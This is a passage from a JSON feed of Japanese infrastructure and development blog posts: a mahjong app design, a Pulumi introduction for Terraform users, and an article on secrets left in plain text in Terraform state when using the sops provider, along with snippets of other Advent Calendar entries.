親ユーザーが部屋を作り、他のユーザーを登録していく   - 作成できる部屋は10部屋まで   - 親は参加のためのパスワードを設定する   - 子は親に部屋IDとパスワードを共有してもらう   - 3人以上いないと対局結果は登録できない、四麻は四人   - 部屋の削除機能も必要- 各部屋のホーム画面では各部屋での自分の戦績が表示される- オフラインで対局した点数結果とそのユーザーと何家かをアプリに登録する   - 点数結果だけでいいの？      - 毎回上がり役とかを登録してると、面倒くさいと思う   - 三麻も登録できるようにする。   - 点数の合計点を計算し、ユーザーの入力をチェックする   - 同点の場合は、東寄りが上位- 取り消し機能も必要   - 「対局」という粒度で削除できるようにする。これは点数とユーザを登録したひと塊。      - 間違えてもその「対局」を消し、また新しい「対局」を作ればいい - 自分または同じ部屋のユーザーの成績を確認できるようにする    - 平均順位   - 一位率   - 二位率   - 三位率   - 四位率   - とび率   - 対局数   - 平均得点   - 各項目のランキングも出す   - 「n局以上」で検索できるようにする- 対局の登録、削除のたびに個人成績を計算しなおすデータベース設計ER図を書きます。要件定義にあるように今回のアプリではユーザーのログイン機能や、そのユーザーが作成、参加する部屋、その部屋ごとの戦績など、テーブルが複雑にリレーションを張るので設計に入る前に整理することができます。ある程度機能を盛り込む予定の個人開発では必須でしょう。画面遷移画面遷移図を書きます。ページとその機能、ページ同士の遷移を定義します。ここで定義したことはすなわちユーザーアクションのすべてなので、ユーザーアクションごとのテストがしやすくなります。実際の画面遷移図↓以上のような要件定義、設計を行うことで、実装での手戻りが少なくなり、快適に実装ができました。これからアプリケーション自体はほとんど完成しているので、コンテナ化し、それをECSやCloud Runにデプロイし、運用していく予定です！","isoDate":"2023-12-17T05:21:40.000Z","dateMiliSeconds":1702790500000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"terraform test: 基本機能","link":"https://zenn.dev/kyohei_saito/articles/a32b5a11c81e97","contentSnippet":"この記事は 3-shake Advent Calendar 2023 17 日目の記事です！ この記事に書いてあることこの記事を含め 3 回に渡って terraform test の機能を紹介します。terraform test: 基本機能 <- 今ここterraform test: 応用機能terraform test: 細かい挙動 terraform test とはなにか 概要terraform test は Terraform module を実際に plan / apply して動作を確認するツールです。ドキュメントにも明記されている通り、主な使...","isoDate":"2023-12-16T14:58:00.000Z","dateMiliSeconds":1702738680000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"Terraform使いがPulumiに入門しました","link":"https://blog.masasuzu.net/entry/2023/12/16/000000","contentSnippet":"この記事は3-shake Advent Calendar 2023の16日目の記事です。qiita.comこの内容はSRETT #8で発表した内容に補足しています。3-shake.connpass.com    前提語らないことモチベーションPulumiとは対応言語PulumiのアーキテクチャPulumiのコンポーネントPulumi CloudPulumi Cloud 料金Pulumi操作方法PulumiインストールPulumi CloudへログインProjectの作成変更を確認Stackデプロイリソース削除state操作Terraformからの移行TerraformとPulumiを共存する(tfstateを参照)tfstateからインポートterraformからコード変換まとめ前提筆者は以下の背景を持っています。普段はAWSをメインに触っている普段はTerraformをメインで使ってるPulumiはプロダクションでは使ったことがないちゃんとは把握できてない語らないこと以下のようなPulumi以外の基本的なことは語りませんIaCとは概要、特徴、メリット・デメリットTerraformとは概要、特徴、メリット・デメリット、操作方法モチベーションなんでPulumiを今回調べようかと思った動機について書こうと思います。Terraformの記述力に限界を感じていたというところが大きいです。以下の点がつらいかなと思っていたところです。足りない関数二重ループのためのModule使用分岐処理のためのcountと三項演算子とはいえ、記述力が低いからこそ複雑なことを抑制できて可読性が上がっている面もあると思います。冗長でも、可読性が高いというのはメリットではあります。他の選択肢としては以下のものがあるかと思います。CDKAWSに限定されるCDKTF(CDK for Terraform)結局terraformのJSONコードに変換されるので、terraformに依存しますそれ自体は悪くないが、どうせならTerraformから離れたものを学びたいそこでなにか良いものがないかと思い当たったところにPulumiがあったので調べてみようとなりました。PulumiとはPulumiはプログラミング言語でインフラを構築可能なプロビジョニングツールです。Terraformと同じようにProviderを通して複数のクラウドに対応しています。TerraformはHCLという宣言的言語を使用するのに対し、Pulumiは汎用的なプログラミング言語を使用してインフラリソースを定義します。Pulumi - Infrastructure as Code in Any Programming Language対応言語TypeScript & JavaScript (Node.js)PythonGoC#, VB, F# (.NET)JavaPulumi YAML参考: Pulumi Languages & SDKs | Pulumi DocsPulumiのアーキテクチャ以下のようの構成になっています。参考: How Pulumi Works | Pulumi DocsLanguage hostインフラリソースの定義を Program (後述)として好きな言語で定義します。Deployment Engine希望する状態に変更するための操作セットを実行する役割を果たします。Resource Providerクラウドサービスとの通信を処理して、Programで定義したリソースの変更処理を行います。上記の例だと、Programにリソースの定義がある場合、Stateと比較して、管理されているリソースであるかを確認します。存在すれば、プロバイダーを通して実際のクラウドのリソースの状態と比較して差分があれば適用。存在しない場合、プロバイダーを通してリソースを作成。PulumiのコンポーネントWhat is Pulumi? | Pulumi DocsPulumiのコンポーネントは以下のようになっています。ProjectProgramのソースコードとメタデータ(Programの実行方法)を格納したディレクトリProgramインフラのあるべき姿を定義したものResourceインフラを構成するオブジェクト。ResourceのプロバティはOutputとして他のResourceのInputに使用することができますStackProgramを実行すると作成されるインスタンス。同一のProgramから開発、ステージング、本番環境のStackを個別に作成することができます。Pulumi CloudTerraform Cloudのようなものと考えていただいて良いです。デプロイの状態、履歴やシークレットを管理して、CI/CDやGitHubと連携してデプロイを実行することもできます。Pulumi CLIはバックエンドを明示的に指定しない限りはでデフォルトでPulumi Cloudを使用します。Terraformはデフォルトでlocalバックエンドを使用します。以下はPulumi Cloudの画面です。Pulumi Cloud 料金個人で使う限りは無料で使用することができます。※2023/12/18現在Pulumi操作方法ここからPulumiの操作方法を見て行きたいと思いますPulumiインストール個人的にはバージョン管理したいのでasdfでインストールします。brewでもインストールできます。# .tool-versionspulumi 3.97.0 asdf installPulumi CloudへログインデフォルトではPulumi Cloudへログインします。以下のコマンドを実行するとブラウザが起動するので、ログイン処理をします。pulumi loginPulumi Cloudを使わず、ローカルにstateを保存したい場合は以下のとおりです。pulumi logoutpulumi loign --localProjectの作成pulumi new コマンドで新しいProjectを作成できます。同時にStackも作成されます。引数にテンプレートを指定できます。ウィザード形式で設定をすることができます。以下の例は awsプロバイダーを使用して、言語はTypeScriptを使用するテンプレートとなります。ディレクトリ内にはPulumi実行に必要な各種ファイルが生成されます。ここで見るべきは以下の3ファイルです。Pulumi.yamlプロジェクト設定Pulumi.dev.yamlStack(dev)設定index.tsリソース定義# Pulumi.yamlname: sampleruntime: nodejsdescription: A minimal AWS TypeScript Pulumi program# Pulumi.dev.yamlconfig:aws:region: us-east-1// index.tsimport * as pulumi from \\"@pulumi/pulumi\\";import * as aws from \\"@pulumi/aws\\";import * as awsx from \\"@pulumi/awsx\\";// Create an AWS resource (S3 Bucket)const bucket = new aws.s3.Bucket(\\"my-bucket\\");// Export the name of the bucketexport const bucketName = bucket.id;変更を確認plumi preview コマンドでStackの変更差分を確認できます。 terraform plan を似ていますが、こちらは差分の詳細は表示されません。Stackデプロイpulumi up コマンドでStackをデプロイできます。 terraform plan と terraform apply を組み合わせた挙動になります。実行すると選択肢が出ます。details を選択すると変更差分の詳細が表示されます。yesを選択すると、変更が適用されます。リソース削除pulumi destroy でStackを削除できます。pulumi up と同じようにdetailsで詳細表示、 yes で削除実行ができますstate操作PulumiではStackごとにStateが保存されています。Stateを操作するコマンドは以下のとおりです。state出力(terraform state pull 相当 )pulumi stack exportstate インポート(terraform import相当)pululmi import <TYPE> <NAME> <ID>state 削除(terraform state rm 相当)pulumi state delete <URN>Terraformからの移行Terraformからの移行オプションは以下の通りとなります。terraformとPulumiを共存するPulumiからtfstateを参照するtfstateからリソースをPulumiへインポートするTerraformのコードをPulumiのコードに変換する参考: Adopting Pulumi | Pulumi Docs参考: Migrating from Terraform | Pulumi DocsTerraformとPulumiを共存する(tfstateを参照)networkリソースに関しては既存のterraformを使いつつ、そのoutputをPulumiで使うイメージになります。以下のようなコードでlocalのtfstateが参照できるので、値を参照して利用することができます。import * as aws from \\"@pulumi/aws\\";import * as terraform from \\"@pulumi/terraform\\";// Reference the Terraform state file:const networkState = new terraform.state.RemoteStateReference(\\"network\\", {    backendType: \\"local\\",    path: \\"/path/to/terraform.tfstate\\",});// Read the VPC and subnet IDs into variables:const vpcId = networkState.getOutput(\\"vpc_id\\");const publicSubnetIds = networkState.getOutput(\\"public_subnet_ids\\");// Now spin up servers in the first two subnets:for (let i = 0; i < 2; i++) {    new aws.ec2.Instance(`instance-${i}`, {        ami: \\"ami-7172b611\\",        instanceType: \\"t2.medium\\",        subnetId: publicSubnetIds[i],    });}tfstateからインポートpulumi import --from terraform ./terraform.tfstate のようにすることによってtfstateからリソースをインポートすることができます。terraformからコード変換pulumi convert --from terraform コマンドを使用することで、既存のTerraformのコードをPulumiのコードに変換することができます。ただし、変換できないコードはTODOコメントが付く。90%~95%は変換が対応しているとのこと。pulumi convert --from terraform --language typescriptまとめPulumiの概要と基本操作をTerraformと対比しながら説明してきました。新規プロジェクトである程度複雑な処理をしたい。プログラミング言語に精通している人がメンバーにいる。そういった場合にはPulumiは良さそうに思えます。しかしながら、ある程度Terraformで出来上がっているプロジェクトをPulumiに移行するのはそれなりに大変なので、プロジェクトの規模感とコストに見合うかを考えて導入するか考えると良いでしょう。また、複雑なことをしたいというのは、本当に必要とされていることなのでしょうか?冗長でも簡易的な書き方をした方が望ましい場合もあるかと思います。そのあたりの目利きをちゃんと考えたいところです。自分自身まだまだ使いこなせていないですし、追いきれてないPulumiのトピックもあるので、今後も選択肢の一つとして調べていきたいところです。","isoDate":"2023-12-15T15:00:00.000Z","dateMiliSeconds":1702652400000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"sbt-github-acitons を使った CI の構築とプロジェクトの publish について","link":"https://zenn.dev/nomadblacky/articles/4c6a03aa5289c4","contentSnippet":"この記事は Scala Advent Calendar 2023 15日目 の記事です。 導入Scala プロジェクトを GitHub で開発する際には GitHub Actions を使用して CI を構築することが多いと思います。また、ライブラリの開発の場合は Maven Central に publish することも考えたいです。しかし、プロジェクトそれぞれに対応した GitHub Actions を構築するのは専門知識も必要で手間のかかる作業です。今回は sbt-github-actions という sbt プラグインを使用して、Scala プロジェクトの CI と ...","isoDate":"2023-12-15T03:00:00.000Z","dateMiliSeconds":1702609200000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"VPC エンドポイントポリシーで S3 バケットを制限する際の落とし穴","link":"https://zenn.dev/toshikish/articles/e846fa0c3de10f","contentSnippet":"状況設定AWS の VPC エンドポイントポリシーで VPC 内部から　Amazon S3 バケットへのアクセスを制限するために，以下のようなエンドポイントポリシーを設定するとします。s3-vpc-endpoint-policy.json{    \\"Version\\": \\"2012-10-17\\",    \\"Statement\\": [        {            \\"Effect\\": \\"Allow\\",            \\"Principal\\": \\"*\\",            \\"Action\\": \\"s3:*\\",            \\"Resource...","isoDate":"2023-12-14T22:00:00.000Z","dateMiliSeconds":1702591200000,"authorName":"toshikish","authorId":"toshikish"},{"title":"拝啓、CSSでドット絵を描きたくなったあの日(数週間前)の自分へ","link":"https://zenn.dev/nedoko_dok0dko/articles/c00b941f10501f","contentSnippet":"※ 3-shake Advent Calendar 2023の15日目のエントリー記事です。※ 12/21追記: CSS Advent Calendar 2023の21日目のエントリー記事として追加しました。投稿期間とズレてしまっていますが、CSSアドベントカレンダー盛り上がりの一助になればと思います。今年は数年離れていたデータエンジニアを再スタートし、データ基盤構築やGoogleCloudのProfessional試験を受けて合格したり…とテッキーな事に触れることが多い年でした。最近はDBやSRE領域に触れる機会もあり、自分の知識不足に凹みながらも「今は学ぶ時期だ」と1つずつ知識...","isoDate":"2023-12-14T15:31:58.000Z","dateMiliSeconds":1702567918000,"authorName":"seno","authorId":"seno"},{"title":"AWS Fault Injection Service で EKS の障害テストを行う","link":"https://zenn.dev/kyohei_saito/articles/6d1bcc1fe8610e","contentSnippet":"この記事は 3-shake Advent Calendar 2023 14 日目の記事です！ この記事に書いてあることこの記事では、AWS Fault Injection Service をつかって、EKS 上の Pod の障害テストを行う方法を説明します。この記事を書こうと思ったモチベーションとして、EKS 上のアプリケーションで障害テストをするために AWS Fault Injection Service (以降、「FIS」と記載します) を使用しようとしたところ、導入手順がいまいち分からなかったため、残しておこうと思ったためです。EC2 に障害を注入する場合は導入手順はシ...","isoDate":"2023-12-13T22:22:00.000Z","dateMiliSeconds":1702506120000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"[Kubernetes 1.27] Pod 停止時のフェーズ遷移の変更","link":"https://zenn.dev/toversus/articles/88ce2ea66b532d","contentSnippet":"Kubernetes 1.27 で KEP-3329: Retriable and non-retriable Pod failures for Jobs の一部として実装された [k/k#115331]: Give terminal phase correctly to all pods that will not be restarted により、Pod 停止時のフェーズが Running から Succeeded か Failed に遷移するようになりました。しかし、この変更が以下の予期せぬ問題を引き起こすことになります。[k/k#117018]: daemonset stuc...","isoDate":"2023-12-13T00:43:43.000Z","dateMiliSeconds":1702428223000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Unlocking Cloud Native Security","link":"https://speakerdeck.com/kyohmizu/unlocking-cloud-native-security","contentSnippet":"CloudNative Days Tokyo 2023 の登壇資料です。2023/12/12\\rhttps://event.cloudnativedays.jp/cndt2023","isoDate":"2023-12-12T05:00:00.000Z","dateMiliSeconds":1702357200000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Helmfile でちょっとしたリソースを追加したい","link":"https://zenn.dev/toshikish/articles/5ead548816e618","contentSnippet":"動機Helmfile で公式のチャートをインストールしていて，追加で関連リソースを追加したいことがあります。関連リソースの数が多い，内容が環境によって変わるなどの場合は，カスタムチャートを追加することになるでしょう。ただ，そこまで複雑ではない，関連リソースが数個レベルの場合，カスタムチャートだと大げさに感じることがあります。そこでどうすべきか迷っていたところ，同僚の toVersus さんに別の方法を教えていただきました。 extraTemplates 系の変数を使うHelm チャートによっては extraTemplates や extraObjects といった変数が...","isoDate":"2023-12-11T10:57:21.000Z","dateMiliSeconds":1702292241000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Amazon S3 バケットの terraform destroy に注意","link":"https://zenn.dev/toshikish/articles/190fe076cc63f4","contentSnippet":"TL;DRAmazon S3 バケットを削除する前には，必ずすべてのオブジェクトを削除しよう。aws_s3_bucket リソースの force_destroy 引数 を true にしてもよい。terraform destroy で削除すると，パブリックアクセスできる旨のアラートが出る場合があるので注意しよう。aws_s3_bucket_public_access_block リソースを terraform state rm するとアラートが出ない。マネジメントコンソールから削除してもアラートは出ない。 S3 バケットの terraform dest...","isoDate":"2023-12-11T09:03:06.000Z","dateMiliSeconds":1702285386000,"authorName":"toshikish","authorId":"toshikish"},{"title":"sqldefとpgrollを利用したPostgreSQLでのスキーマブルーグリーンデプロイメント","link":"https://zenn.dev/nnaka2992/articles/blue_grean_on_postgres_with_sqldeff_and_pgroll","contentSnippet":"この記事はこのエントリー以下のアドベントカレンダーの11日目の記事です。3-shake Advent Calendar 2023昨日はtoyb0xによるTODOコメントをチケット管理するためのESLint Custom Ruleでした。PostgreSQL Advent Calendar 2023昨日は@ozozatyによるPostgreSQLのjsonb型でJSONパス式(JSONPath)を使うでした。 はじめにPostgreSQLではDDLはその性質からテーブルレベルでロックを取得してしまいます。SREやPlatform EngineeringなどDev...","isoDate":"2023-12-10T23:30:00.000Z","dateMiliSeconds":1702251000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"GitLab CIでKICSを実行する","link":"https://zenn.dev/tayusa/articles/d28865c5ce49c6","contentSnippet":"やることTerraformの静的解析を行うKICSの結果をgitlab-commentでMRに出力するhttps://github.com/yuyaban/gitlab-commentKICSの結果を基にMRにReviewdogで指摘するhttps://github.com/reviewdog/reviewdog KICSの実行$ kics scan --config kics.yamlkics.yamlpath: \\".\\" # 解析するTerraformの場所output-path: \\".\\" # 結果の出力先report-formats:...","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"Golangでk8s Deploymentを再起動させる","link":"https://zenn.dev/tayusa/articles/a7df40b7d6fd5b","contentSnippet":"やることclient-goを使って複数のDeploymentを同時に再起動させる Golang Deploymentの取得Pod内であればrest.InClusterConfig()でPodのServiceAccountを使用するconfigを取得できるclientset.AppsV1().Deployments(namespace).Get(ctx, deploymentName, metav1.GetOptions{}) でDeploymentを取得NamespaceとDeploymentの名前が必要k8s.gopackage maini...","isoDate":"2023-12-10T00:00:00.000Z","dateMiliSeconds":1702166400000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"TypeScript で LangChain の最初の一歩","link":"https://zenn.dev/satohjohn/articles/9415f85be332e6","contentSnippet":"このエントリーは 3-shake Advent Calendar 2023 の10日目の記事です。今年は Python をガッツリ触ったり、 LLM などの方面に手を出してきており、新しいことにまみれております。その中で LLM のシステム作るんだったら Python だろ？っていう中で TypeScript でもちゃんとできるよーっていうことで紹介していきたいと思います。 私が、あんまり Python でアプリ作っていくのが好きじゃないのもありますもちろん、 Python よりも TypeScript のほうが機能が少なめではありますので、そのあたりは、目をつぶっております。今...","isoDate":"2023-12-09T15:00:00.000Z","dateMiliSeconds":1702134000000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Mastering Bitcoin Third Editionの紹介","link":"https://speakerdeck.com/shukob/mastering-bitcoin-third-editionnoshao-jie","contentSnippet":"https://cryptocurrency.connpass.com/event/303416/\\r2023年12月9日(土)ビットコインとか忘年会のLTで、同年11月に出版されたMastering Bitcoin Third Editionの紹介をしました。","isoDate":"2023-12-09T05:00:00.000Z","dateMiliSeconds":1702098000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"今よりちょっとだけ上手く文章を書くコツ","link":"https://qiita.com/kojake_300/items/c5def031a252323fae1c","contentSnippet":"この記事は、3-shake Advent Calendar 2023 9日目のエントリ記事です。技術的な話ではありませんはじめに国語がとても苦手だった私は、社会人になったときに日本語力の無さにかなり苦労しました。そんな中、「日本語の作文技術」という本を読み、わかりや...","isoDate":"2023-12-08T22:01:43.000Z","dateMiliSeconds":1702072903000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Terraformのsopsプロバイダーを使用するだけで機密情報は守られるのか","link":"https://blog.masasuzu.net/entry/2023/12/09/014230","contentSnippet":"qiita.comこの記事は、3-shake Advent Calendar 2023の9日目の記事となります。sops プロバイダーとは本当に安心?ドキュメントを調べる挙動を実験する結論ワークアラウンドsops プロバイダーとはcarlpett/terraform-provider-sops: A Terraform provider for reading Mozilla sops filesDocs overview | carlpett/sops | Terraform | Terraform RegistrysopsプロバイダーはMozilla sopsを使用して暗号化されたファイルから機密情報を取り出して、terraform上で使用できるようにしたものです。暗号化の鍵をAWS KMS等を使うことにより、KMSキーを使う権限を持つ人だけ機密情報にアクセスできるようにするものです。sopsで機密情報を暗号化することにより、平文で機密情報をgitレポジトリに保存することがなくなり安全ということになります。機密情報を管理したい。でも平文では保存したくない。そういう用途にこちらは使用されます。本当に安心?SOPSを使って機密情報を暗号化することによりgitレポジトリには機密情報が平文で残らない。これで安心と言われていますが、よく考えると機密情報をterraform実行時にはリソースに対して平文で与えているはずです。つまり、tfstate上は機密情報が平文で保存されています。例えば、tfstateがS3に保存されているとして、KMSキーへの権限がない人でもS3バケットにアクセスする権限があれば、平文の機密情報が見れてしまいます。あまりないと思いますが、tfstateをlocalに保存するようにしていてそれをgit管理していてらなんのために暗号化しているのか。。。。ということになります。こう考えると組織のポリシーによるが、sopsプロバイダーによる暗号化では不十分ではないかという疑問が生まれます。ドキュメントを調べるまずプロバイダードキュメントを当たってみます。Docs overview | carlpett/sops | Terraform | Terraform RegistryTo prevent plaintext secrets from being written to disk, you\xa0must\xa0use a secure remote state backend. See the\xa0official docs\xa0on\xa0Sensitive Data in State\xa0for more information.これが意味してるのはバックエンドをlocalにした場合平文で機密情報が書かれるので、安全なリモートバックエンドを利用すべきということだと思います。State: Sensitive Data | Terraform | HashiCorp Developer参照しろと言われたドキュメントの該当部分を読んでみましょう。ローカルディスクにtfstateを保存した場合は、機密情報が平文で保存されます。リモートにtfstateを保存する場合、保存時に暗号化されるかはバックエンドに依存します。基本的にリモートステートを使うことを推奨しています。例えば、Terraform Cloudを使う場合、tfstateは暗号化され、転送時もTLSで暗号化されます。S3を使う場合もSSE-S3やSSE-KMS等でサーバサイド暗号化を有効にしておくことで、保管時の暗号化がされます。バケットポリシーでHTTPSを強制することで通信時の暗号化も保証することができます。参考: 暗号化によるデータの保護 - Amazon Simple Storage Service参考: Amazon S3 のセキュリティのベストプラクティス - Amazon Simple Storage Serviceところがですね。保存時、通信時の暗号化をしても、terraform state pullすると平文でtfstateが手に入ってしまうんですよ。。。後述します。挙動を実験する以下のような設定ファイルを作ります。sopsで暗号化したdb_userとdb_passwordをパラメータストアに設定するものになります。tools-versionsterraform 1.5.5sops 3.7.3main.tfterraform {  required_version = \\"~> 1.5.5\\"  required_providers {    aws = {      source  = \\"hashicorp/aws\\"      version = \\"~> 5.15\\"    }    sops = {      source  = \\"carlpett/sops\\"      version = \\"~> 0.7.2\\"    }  }  backend \\"s3\\" {    region  = \\"ap-northeast-1\\"    bucket  = \\"xxxxxxxxxx\\"    key     = \\"test.tfstate\\"  }}provider \\"sops\\" {}provider \\"aws\\" {  region = \\"ap-northeast-1\\"}data \\"sops_file\\" \\"secrets\\" {  source_file = \\"secrets.yaml\\"}resource \\"aws_ssm_parameter\\" \\"db_user\\" {  type     = \\"String\\"  name     = \\"/test/db_user\\"  value    = data.sops_file.secrets.data.db_user}resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    = data.sops_file.secrets.data.db_password}暗号化前の secrets.yamldb_user: userdb_password: passwordapply結果がこちらとなります。terraform apply% export SOPS_KMS_ARN=arn:aws:kms:ap-northeast-1:xxxxxxxxx:key/yyyyyyyyyyyyyyyyyy% terraform applydata.sops_file.secrets: Reading...data.sops_file.secrets: Read complete after 1s [id=-]Terraform used the selected providers to generate the following execution plan. Resource actions areindicated with the following symbols:  + createTerraform will perform the following actions:  # aws_ssm_parameter.db_password will be created  + resource \\"aws_ssm_parameter\\" \\"db_password\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_password\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"SecureString\\"      + value          = (sensitive value)      + version        = (known after apply)    }  # aws_ssm_parameter.db_user will be created  + resource \\"aws_ssm_parameter\\" \\"db_user\\" {      + arn            = (known after apply)      + data_type      = (known after apply)      + id             = (known after apply)      + insecure_value = (known after apply)      + key_id         = (known after apply)      + name           = \\"/test/db_user\\"      + tags_all       = (known after apply)      + tier           = (known after apply)      + type           = \\"String\\"      + value          = (sensitive value)      + version        = (known after apply)    }Plan: 2 to add, 0 to change, 0 to destroy.Do you want to perform these actions?  Terraform will perform the actions described above.  Only \'yes\' will be accepted to approve.  Enter a value: yesaws_ssm_parameter.db_password: Creating...aws_ssm_parameter.db_user: Creating...aws_ssm_parameter.db_user: Creation complete after 0s [id=/test/db_user]aws_ssm_parameter.db_password: Creation complete after 0s [id=/test/db_password]Apply complete! Resources: 2 added, 0 changed, 0 destroyed.terraform apply  8.91s user 0.78s system 124% cpu 7.811 totalstate showするとパラメータストアなのでsensitive扱いになっていて、見れません。これはいけるか?terraform state show% terraform state show aws_ssm_parameter.db_password# aws_ssm_parameter.db_password:resource \\"aws_ssm_parameter\\" \\"db_password\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\"    data_type = \\"text\\"    id        = \\"/test/db_password\\"    key_id    = \\"alias/aws/ssm\\"    name      = \\"/test/db_password\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"SecureString\\"    value     = (sensitive value)    version   = 1}% terraform state show aws_ssm_parameter.db_user    # aws_ssm_parameter.db_user:resource \\"aws_ssm_parameter\\" \\"db_user\\" {    arn       = \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_user\\"    data_type = \\"text\\"    id        = \\"/test/db_user\\"    name      = \\"/test/db_user\\"    tags_all  = {}    tier      = \\"Standard\\"    type      = \\"String\\"    value     = (sensitive value)    version   = 1}ここで、terraform state pullをしてみて、tfstateファイルをローカルにダウンロードします。そのtfstateファイルの中の該当部分はこちらとなります。    {      \\"mode\\": \\"managed\\",      \\"type\\": \\"aws_ssm_parameter\\",      \\"name\\": \\"db_password\\",      \\"provider\\": \\"provider[\\\\\\"registry.terraform.io/hashicorp/aws\\\\\\"]\\",      \\"instances\\": [        {          \\"schema_version\\": 0,          \\"attributes\\": {            \\"allowed_pattern\\": \\"\\",            \\"arn\\": \\"arn:aws:ssm:ap-northeast-1:xxxxxxxxx:parameter/test/db_password\\",            \\"data_type\\": \\"text\\",            \\"description\\": \\"\\",            \\"id\\": \\"/test/db_password\\",            \\"insecure_value\\": null,            \\"key_id\\": \\"alias/aws/ssm\\",            \\"name\\": \\"/test/db_password\\",            \\"overwrite\\": null,            \\"tags\\": null,            \\"tags_all\\": {},            \\"tier\\": \\"Standard\\",            \\"type\\": \\"SecureString\\",            \\"value\\": \\"password\\",            \\"version\\": 1          },          \\"sensitive_attributes\\": [            [              {                \\"type\\": \\"get_attr\\",                \\"value\\": \\"value\\"              }            ]          ],          \\"private\\": \\"bnVsbA==\\",          \\"dependencies\\": [            \\"data.sops_file.secrets\\"          ]        }      ]    },tfstateファイルの中身をよく確認するとしっかり平文で見えています。残念。\\"value\\": \\"password\\",結論sopsプロバイダーを使用することによりgitレポジトリ上に機密情報を平文で保存することはなくなります。しかしながら、tfstateのデータ上では設定値が平文で保存されることを防ぐことはできません。terraform state pullする権限があれば、機密情報が見れてしまいます。運用組織のポリシーで、tfstateへのアクセス権限を適切に権限管理することができるのであれば、選択肢としては取りうります。暗号化のためのKMSキー、tfstateを保存するS3バケットを機密情報をアクセス可能な人のみ権限を与えることが徹底できればよいです。しかしながら、機密情報をいかなる場合でもローカルに平文で保存することが許容されない組織であれば、機密情報は手動で設定することを選択したほうが望ましいと思います。どうしても機密情報をterraformで管理したのであれば、クライアントサイドで暗号化した機密情報をterraformで管理し、アプリ等で使用時にクライアントサイドで復号を行う形も考えられます。安全かどうかは、tfstateの保存場所、tfstateへのアクセス権限、暗号化鍵のアクセス権限それぞれが適切に設定されているかどうかが鍵となります。他に何かうまい方法で機密情報を管理しているという方がいらっしゃれば、ご意見ください。ワークアラウンドこれは自分がよく使う手段となります。リソースの箱だけ作って、作成時にダミーの値を入れておき、実際の値は手動で設定するという手法です。ignore_changesを入れておくことで、手動で値を変更しても、terraform的には差分ができないようにしています。これにより、機密情報をterraformの外に追い出しつつも、機密情報を入れるリソース自体は監理するということが実現できます。resource \\"aws_ssm_parameter\\" \\"db_password\\" {  type     = \\"SecureString\\"  name     = \\"/test/db_password\\"  value    =  \\"Dummy\\"  lifecycle {    ignore_changes = [value]  }}","isoDate":"2023-12-08T16:42:30.000Z","dateMiliSeconds":1702053750000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AlloyDB omni on Kubernetesを眺める","link":"https://zenn.dev/nnaka2992/articles/viewing_alloydb_omni_operator","contentSnippet":"このエントリーは以下のアドベントカレンダーの6日目の記事です。3-shake Advent Calendar 2023 シリーズ1昨日は@bells17さんによるChainguard imagesについて調べてみたでした。PostgreSQL Advent Calendar 2023 シリーズ2Kubernetes Advent Calendar 2023昨日は@yassan168さんによるRKE2ノードのCiliumを使ったeBPFな帯域制限をする話でした。 背景を眺める2023年10月12日にAlloyDB OmniのGAに併せてAlloyDB Omni o...","isoDate":"2023-12-05T23:30:00.000Z","dateMiliSeconds":1701819000000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Chainguard imagesについて調べてみた","link":"https://zenn.dev/bells17/articles/chainguard-images","contentSnippet":"※この記事は3-shake Advent Calendar 2023 シリーズ1の12月5日の記事です最近Chainguard imagesというdistrolessコンテナイメージについて知ったので、簡単に調べてみました。 Chainguard imagesとは？Chainguard imagesはChainguard社によって提供されているdistrolessを中心としたセキュアなコンテナイメージ群だ、という理解です。Wolfiという(おそらくこれもChainguard社が開発している)コンテナ・クラウドネイティブ用途向けのLinux undistroなOSを利用して各C...","isoDate":"2023-12-05T03:58:09.000Z","dateMiliSeconds":1701748689000,"authorName":"bells17","authorId":"bells17"},{"title":"Cloud Loggingについて","link":"https://zenn.dev/nedoko_dok0dko/articles/ef07acbb983d01","contentSnippet":"whatGoogle CloudのCloud Loggingについて基本概要など調べたことをまとめる適宜追記予定 Cloud Loggingとはhttps://cloud.google.com/logging/docs/overview?hl=jaGoogleCloud上のシステム等が生成したログを収集・保管・管理するための仕組み。基本的にGoogleCloud上のサービスが出力するログはCloud Loggingへと集められる。収集されたログはログバケットと呼ばれるストレージで保管され、期間が過ぎたら破棄するといった設定を行うことが可能。ログはコンソールのログ...","isoDate":"2023-12-04T11:05:41.000Z","dateMiliSeconds":1701687941000,"authorName":"seno","authorId":"seno"},{"title":"吉祥寺.pm35 でLTしてきました。 #kichijojipm","link":"https://blog.masasuzu.net/entry/2023/12/03/161754","contentSnippet":"吉祥寺.pm こと 句会吉祥寺.pm35 